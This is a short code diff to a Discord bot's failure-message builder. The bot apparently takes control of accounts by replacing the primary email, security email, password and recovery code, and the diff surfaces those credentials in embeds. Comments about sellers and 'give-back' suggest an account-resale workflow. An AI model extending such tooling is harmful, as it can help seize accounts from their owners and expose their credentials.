@@ -67,14 +67,32 @@ def build_failure_embed(
     error: str | None = None,
     credentials_changed: bool = False,
 ) -> Embed:
+    """Failure DM/embed. ``email`` is the submitted/original address.
+
+    When primary alias was already replaced, ``ms["email"]`` is the new primary
+    (sunny@…). On give-back failures we must surface that — the old address may
+    already be deleted. Success seller embeds still hide sunny separately.
+    """
     detail = error or reason
+    original = _clean(ms.get("original_email") or email, fallback=email)
+    primary_raw = str(ms.get("email") or "").strip()
+    primary_ok = bool(
+        primary_raw
+        and primary_raw not in {"Couldn't Change!", "Unknown", "?"}
+        and primary_raw.lower() != original.lower()
+    )
+    # Login email for copy line: prefer new primary when alias already changed
+    login_email = primary_raw if primary_ok else original
+
     embed = Embed(
         title="Failed to secure account",
         description=reason,
         color=0xFA4343,
     )
     embed.add_field(name="Error", value=f"```{detail[:1000]}```", inline=False)
-    embed.add_field(name="Original Email", value=f"```{email}```", inline=False)
+    embed.add_field(name="Original Email", value=f"```{original}```", inline=False)
+    if primary_ok:
+        embed.add_field(name="Primary Email", value=f"```{primary_raw}```", inline=False)
     if credentials_changed:
         if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
             embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
@@ -84,7 +102,7 @@ def build_failure_embed(
             embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
         add_credential_line_field(
             embed,
-            email=email,
+            email=login_email,
             recovery=ms.get("recovery_code", ""),
             password=ms.get("password", ""),
             security_email=ms.get("security_email", ""),
